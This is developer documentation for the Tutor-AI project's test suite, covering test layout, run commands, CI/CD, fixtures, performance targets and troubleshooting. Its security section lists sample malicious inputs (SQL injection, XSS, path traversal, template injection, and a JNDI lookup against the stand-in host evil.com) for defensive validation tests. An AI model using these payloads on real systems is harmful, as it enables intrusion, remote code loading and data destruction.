# 🧪 Comprehensive Testing Documentation

## Table of Contents

1. [Overview](#overview)
2. [Test Structure](#test-structure)
3. [Test Categories](#test-categories)
4. [Running Tests](#running-tests)
5. [Test Dashboard](#test-dashboard)
6. [CI/CD Pipeline](#cicd-pipeline)
7. [Test Data Management](#test-data-management)
8. [Performance Testing](#performance-testing)
9. [Security Testing](#security-testing)
10. [Troubleshooting](#troubleshooting)

## Overview

Tutor-AI includes a comprehensive testing infrastructure designed to ensure reliability, performance, and security across all components. The testing suite covers:

- **Backend API Testing**: 70+ endpoints with full CRUD validation
- **Frontend Component Testing**: React components and user workflows
- **Integration Testing**: Cross-service communication and data flow
- **End-to-End Testing**: Complete user journeys with browser automation
- **Performance Testing**: Load testing and optimization validation
- **Security Testing**: Vulnerability scanning and penetration testing

### Key Features

- ✅ **100% API Endpoint Coverage**: All backend endpoints tested
- ✅ **Real User Journey Validation**: Complete learning workflows tested
- ✅ **Cross-Browser Compatibility**: Chrome, Firefox, Safari testing
- ✅ **Mobile Responsive Testing**: Tablet and mobile device validation
- ✅ **Performance Benchmarks**: <2s API response time targets
- ✅ **Accessibility Compliance**: WCAG 2.1 AA standards
- ✅ **Automated CI/CD Integration**: GitHub Actions pipeline

## Test Structure

```
tutor-ai/
├── tests/
│   ├── utils/
│   │   └── test_helpers.py           # Common test utilities
│   ├── backend/
│   │   ├── test_course_management_api.py
│   │   ├── test_pdf_integration.py
│   │   ├── test_ai_chat_system.py
│   │   └── test_cognitive_learning_engine.py
│   ├── frontend/
│   │   └── test_user_workflows.tsx
│   ├── e2e/
│   │   └── test_complete_learning_journey.py
│   ├── integration/
│   │   └── test_full_workflow.py
│   ├── performance/
│   │   └── test_load_performance.py
│   └── security/
│       └── test_vulnerability_scanning.py
├── scripts/
│   └── run_comprehensive_tests.sh   # Main test runner
├── .github/workflows/
│   └── test.yml                     # CI/CD pipeline
└── frontend/src/app/test-dashboard/ # Test dashboard page
```

## Test Categories

### 1. Backend Tests

#### Course Management API Tests
- **File**: `tests/backend/test_course_management_api.py`
- **Coverage**: CRUD operations, validation, error handling, performance
- **Key Tests**:
  - Course creation with validation
  - Course listing and filtering
  - Course updates and deletion
  - Error handling and edge cases
  - SQL injection and XSS prevention
  - Performance under load

#### PDF Integration Tests
- **File**: `tests/backend/test_pdf_integration.py`
- **Coverage**: Upload, processing, content extraction, security
- **Key Tests**:
  - PDF upload with various file sizes
  - Content extraction and indexing
  - File format validation
  - Security scanning (malicious content)
  - Unicode and special character handling
  - Multi-PDF workflows

#### AI Chat System Tests
- **File**: `tests/backend/test_ai_chat_system.py`
- **Coverage**: Chat functionality, RAG, session management
- **Key Tests**:
  - Basic chat interactions
  - Course-specific context filtering
  - Source attribution and citation
  - Session persistence
  - Performance with large contexts
  - Error handling and recovery

#### Cognitive Learning Engine Tests
- **File**: `tests/backend/test_cognitive_learning_engine.py`
- **Coverage**: SRS, active recall, dual coding, metacognition
- **Key Tests**:
  - Spaced repetition algorithm (SM-2)
  - Active recall question generation
  - Bloom's taxonomy integration
  - Dual coding content creation
  - Metacognitive reflection
  - Performance analytics

### 2. Frontend Tests

#### User Workflow Tests
- **File**: `tests/frontend/test_user_workflows.tsx`
- **Coverage**: Component integration, state management, navigation
- **Key Tests**:
  - Course creation and management workflow
  - PDF reading and navigation
  - AI chat integration
  - Responsive design across devices
  - Error boundaries and recovery
  - Loading states and optimization

### 3. End-to-End Tests

#### Complete Learning Journey Tests
- **File**: `tests/e2e/test_complete_learning_journey.py`
- **Coverage**: Full user scenarios, cross-platform compatibility
- **Key Tests**:
  - Complete course creation to study session
  - Multi-user concurrent learning
  - Cross-device compatibility
  - Cognitive learning complete cycle
  - Error recovery and resilience
  - Performance under realistic load
  - Accessibility compliance

### 4. Integration Tests

#### Full Workflow Integration
- **File**: `tests/integration/test_full_workflow.py`
- **Coverage**: Service-to-service communication
- **Key Tests**:
  - Frontend-backend API integration
  - Database transaction consistency
  - File upload and processing pipeline
  - AI provider integration
  - Cache and session management

### 5. Performance Tests

#### Load and Performance
- **File**: `tests/performance/test_load_performance.py`
- **Coverage**: System performance under load
- **Key Tests**:
  - API response time validation
  - Concurrent user handling
  - Memory usage optimization
  - Database query performance
  - Bundle size analysis

### 6. Security Tests

#### Vulnerability Scanning
- **File**: `tests/security/test_vulnerability_scanning.py`
- **Coverage**: Security vulnerabilities and compliance
- **Key Tests**:
  - SQL injection prevention
  - XSS protection
  - File upload security
  - Authentication and authorization
  - Data validation and sanitization

## Running Tests

### Quick Start

```bash
# Run all tests
./scripts/run_comprehensive_tests.sh --all

# Run quick tests (backend + frontend)
./scripts/run_comprehensive_tests.sh --quick

# Run specific test categories
./scripts/run_comprehensive_tests.sh --backend
./scripts/run_comprehensive_tests.sh --frontend
./scripts/run_comprehensive_tests.sh --e2e
```

### Individual Test Execution

#### Backend Tests

```bash
cd backend
pip install -r requirements.txt

# Run all backend tests
pytest tests/ -v

# Run specific test file
pytest tests/test_course_management_api.py -v

# Run with coverage
pytest tests/ --cov=. --cov-report=html
```

#### Frontend Tests

```bash
cd frontend
npm install

# Run all frontend tests
npm run test

# Run tests with coverage
npm run test -- --coverage

# Run integration tests
npm run test:integration
```

#### E2E Tests

```bash
# Install Playwright
cd frontend
npm install --save-dev @playwright/test
npx playwright install

# Run E2E tests
cd ..
pytest tests/e2e/ -v

# Run with specific browser
pytest tests/e2e/ -v --browser chromium
```

### Test Configuration

#### Environment Variables

```bash
# Backend testing
export ENVIRONMENT=testing
export DATABASE_URL=sqlite:///./test.db
export REDIS_URL=redis://localhost:6379
export LOG_LEVEL=ERROR

# Frontend testing
export NODE_ENV=test
export NEXT_PUBLIC_API_URL=http://localhost:8000

# AI Provider testing (use mocks when unavailable)
export OPENAI_API_KEY=your_key_here
export ZAI_API_KEY=your_key_here
export AI_PROVIDER_MOCK=true
```

## Test Dashboard

### Overview

The test dashboard provides a comprehensive web interface for:

- **Real-time test execution monitoring**
- **API endpoint testing**
- **Performance metrics collection**
- **Component interaction testing**
- **Error simulation and debugging**

### Access

Navigate to: `http://localhost:3000/test-dashboard`

### Features

#### 1. Overview Tab
- Test suite status at a glance
- Pass/fail statistics
- Real-time progress tracking
- Performance metrics summary

#### 2. Test Suites Tab
- Detailed test suite management
- Individual test execution
- Error logs and debugging info
- Historical test results

#### 3. API Tests Tab
- Interactive API endpoint testing
- Response time monitoring
- Request/response validation
- Error simulation

#### 4. Performance Tab
- System performance metrics
- Memory usage tracking
- API response time analysis
- Bundle size monitoring

#### 5. Console Tab
- Real-time test execution logs
- Debugging information
- Error tracebacks
- Performance warnings

### Using the Test Dashboard

1. **Run All Tests**: Click the main "Run All Tests" button
2. **Run Individual Suites**: Use the "Run" button on each suite
3. **Monitor Progress**: Watch real-time progress bars and console output
4. **Debug Issues**: Check detailed logs and error messages
5. **Performance Analysis**: Review performance metrics and optimization suggestions

## CI/CD Pipeline

### Overview

The GitHub Actions pipeline provides automated testing on:

- **Push to main/develop branches**: Full test suite
- **Pull requests**: Targeted testing
- **Daily schedule**: Full regression testing
- **Manual triggers**: On-demand testing

### Pipeline Stages

#### 1. Backend Tests
- Python environment setup
- Dependency installation
- Linting and formatting checks
- Unit and integration tests
- Coverage reporting

#### 2. Frontend Tests
- Node.js environment setup
- Dependency installation
- Linting and type checking
- Unit tests with coverage
- Integration tests

#### 3. E2E Tests
- Docker environment setup
- Application stack deployment
- Browser automation testing
- Cross-browser compatibility
- Accessibility validation

#### 4. Performance Tests
- Load testing scenarios
- Performance benchmarks
- Regression detection
- Resource usage monitoring

#### 5. Security Tests
- Dependency vulnerability scanning
- Code security analysis
- Container security scanning
- Configuration validation

#### 6. Deployment (Staging)
- Image building and pushing
- Staging environment deployment
- Smoke tests
- Status notifications

### Configuration

#### Trigger Conditions

```yaml
on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main, develop ]
  schedule:
    - cron: '0 2 * * *'  # Daily at 2 AM UTC
```

#### Environment Variables

```yaml
env:
  NODE_ENV: test
  ENVIRONMENT: testing
  DATABASE_URL: sqlite:///./test.db
  REDIS_URL: redis://localhost:6379
```

## Test Data Management

### Test Fixtures

#### Backend Test Data

```python
# Sample course data
SAMPLE_COURSE = {
    "title": "Test Course: Introduction to Computer Science",
    "description": "A comprehensive test course covering fundamental CS concepts",
    "subject": "Computer Science",
    "difficulty_level": "beginner"
}

# Sample book data
SAMPLE_BOOK = {
    "title": "Test Book: Algorithms Explained",
    "author": "Test Author",
    "description": "A test book covering algorithm fundamentals",
    "isbn": "978-0-123456-78-9"
}
```

#### Frontend Test Data

```typescript
// Mock API responses
const mockCourse = {
  id: 'course-123',
  title: 'Introduction to Machine Learning',
  description: 'Learn the fundamentals of ML',
  subject: 'Computer Science',
  difficulty_level: 'beginner'
};

// Mock user interactions
const mockUserActions = {
  courseCreation: true,
  pdfUpload: true,
  chatInteraction: true,
  navigationEvents: ['home', 'courses', 'study']
};
```

### Database Management

#### Test Database Setup

```bash
# Create isolated test database
export DATABASE_URL="sqlite:///./test_$(date +%s).db"

# Run migrations (if applicable)
python manage.py migrate --database=test

# Seed test data
python scripts/seed_test_data.py
```

#### Cleanup Procedures

```bash
# Clean up test databases
rm -f ./test_*.db

# Clean up test uploads
rm -rf ./test_uploads/*

# Clean up test cache
redis-cli FLUSHDB
```

## Performance Testing

### Load Testing Scenarios

#### Scenario 1: Concurrent Users
```python
# Simulate 50 concurrent users
users = 50
spawn_rate = 5  # Users per second
run_time = 300  # 5 minutes

# Target endpoints:
# - GET /courses (course listing)
# - POST /chat (AI chat)
# - GET /courses/{id}/materials (PDF access)
```

#### Scenario 2: API Load Testing
```python
# Test API endpoints under load
endpoints = [
    {'method': 'GET', 'path': '/courses', 'weight': 40},
    {'method': 'POST', 'path': '/chat', 'weight': 30},
    {'method': 'GET', 'path': '/courses/{id}/materials', 'weight': 30}
]
```

### Performance Benchmarks

#### API Response Times
- **Course listing**: <500ms (95th percentile)
- **Chat responses**: <2000ms (95th percentile)
- **PDF access**: <1000ms (95th percentile)
- **Search queries**: <1500ms (95th percentile)

#### System Resources
- **Memory usage**: <512MB per container
- **CPU usage**: <70% average
- **Disk I/O**: <100MB/s during peak
- **Network latency**: <100ms internal

### Monitoring

#### Metrics Collection
```python
# Performance metrics to track
metrics = {
    'response_time': 'histogram',
    'request_rate': 'counter',
    'error_rate': 'gauge',
    'memory_usage': 'gauge',
    'cpu_usage': 'gauge'
}
```

#### Alerting Thresholds
```yaml
alerts:
  - name: high_response_time
    condition: response_time_p95 > 2000ms
    severity: warning

  - name: high_error_rate
    condition: error_rate > 5%
    severity: critical

  - name: high_memory_usage
    condition: memory_usage > 80%
    severity: warning
```

## Security Testing

### Vulnerability Scanning

#### Dependency Scanning
```bash
# Python dependencies
cd backend
pip-audit --format json --output security-report.json

# Node.js dependencies
cd frontend
npm audit --audit-level=high --json > security-report.json
```

#### Container Security
```bash
# Scan Docker images
trivy image --format json --output security-report.json tutor-ai-backend:latest
trivy image --format json --output security-report.json tutor-ai-frontend:latest
```

### Security Test Cases

#### Input Validation
```python
# Test cases for input validation
malicious_inputs = [
    "'; DROP TABLE courses; --",  # SQL injection
    "<script>alert('xss')</script>",  # XSS
    "../../../etc/passwd",  # Path traversal
    "${jndi:ldap://evil.com/a}",  # JNDI injection
    "{{7*7}}",  # Template injection
]
```

#### Authentication Testing
```python
# Test authentication scenarios
auth_tests = [
    {'scenario': 'valid_login', 'expected': 'success'},
    {'scenario': 'invalid_password', 'expected': 'failure'},
    {'scenario': 'session_hijacking', 'expected': 'failure'},
    {'scenario': 'brute_force', 'expected': 'rate_limited'},
]
```

## Troubleshooting

### Common Issues

#### 1. Test Environment Setup
```bash
# Problem: Tests can't connect to database
# Solution: Check database configuration
echo $DATABASE_URL
docker ps | grep postgres

# Problem: Frontend tests fail with module errors
# Solution: Clean install dependencies
cd frontend
rm -rf node_modules package-lock.json
npm install
```

#### 2. Docker Issues
```bash
# Problem: Containers won't start
# Solution: Check port conflicts
netstat -tulpn | grep :3000
netstat -tulpn | grep :8000

# Problem: Test containers accumulate
# Solution: Clean up containers
docker system prune -f
docker volume prune -f
```

#### 3. Performance Issues
```bash
# Problem: Tests run slowly
# Solution: Check resource usage
htop
docker stats

# Problem: Memory leaks in tests
# Solution: Profile memory usage
python -m memory_profiler tests/performance/test_memory.py
```

#### 4. E2E Test Failures
```bash
# Problem: Browser tests fail intermittently
# Solution: Increase timeouts and add retries
pytest tests/e2e/ --timeout=300 --reruns=3

# Problem: Tests fail on specific browsers
# Solution: Check browser compatibility
npx playwright install --with-deps
```

### Debugging Tips

#### 1. Enable Verbose Logging
```bash
# Backend tests
pytest tests/ -v -s --log-cli-level=DEBUG

# Frontend tests
npm run test -- --verbose --no-cache
```

#### 2. Use Debugger Breakpoints
```python
# In backend tests
import pdb; pdb.set_trace()

# In frontend tests
debugger; // Add to test code
```

#### 3. Check Test Isolation
```bash
# Run tests in isolation to identify conflicts
pytest tests/test_specific.py -x --lf
```

#### 4. Monitor System Resources
```bash
# Monitor during test execution
watch -n 1 'ps aux | grep python'
watch -n 1 'ps aux | grep node'
docker stats --no-stream
```

### Getting Help

#### Resources
- **GitHub Issues**: [Project Issues](https://github.com/your-repo/tutor-ai/issues)
- **Documentation**: [Project Docs](./README.md)
- **Test Logs**: Check `test-reports/` directory
- **CI/CD Logs**: GitHub Actions tab in repository

#### Best Practices
1. **Run tests locally before pushing**
2. **Check test coverage before merging**
3. **Monitor performance trends**
4. **Keep tests updated with code changes**
5. **Use descriptive test names and documentation**

---

## Conclusion

This comprehensive testing infrastructure ensures Tutor-AI maintains high quality, reliability, and performance standards. Regular execution of these tests helps catch issues early and provides confidence in the system's stability and security.

For questions or contributions to the testing suite, please refer to the GitHub repository or contact the development team.